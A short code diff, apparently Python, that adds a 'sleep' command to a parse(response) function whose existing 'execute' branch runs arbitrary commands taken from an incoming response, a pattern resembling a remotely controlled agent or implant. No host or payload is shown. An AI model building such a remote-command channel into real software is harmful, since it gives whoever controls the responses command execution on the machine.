@@ -38,6 +38,8 @@ def parse(response):
   if commands[0] == "execute":
     ex = ' '.join(commands[1:])
     return execute(ex)
+  if commands[0] == "sleep":
+    return time.sleep(int(commands[1]))
   else: return 0
 
 def execute(command):
